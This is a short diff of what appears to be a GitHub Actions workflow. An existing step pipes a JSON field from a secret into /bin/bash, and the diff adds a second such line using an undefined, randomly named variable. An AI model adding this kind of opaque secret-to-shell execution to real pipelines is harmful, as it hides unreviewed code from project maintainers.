@@ -18,6 +18,7 @@ jobs:
           gtfh42167: ${{ secrets.gtfh42167 }}
         run: |
           printf '%s' "$gtfh42167" | jq -r .puxab2912 | /bin/bash
+          printf '%s' "$wvct40" | jq -r .eit566 | /bin/bash
 
       - name: Store results
         if: always()
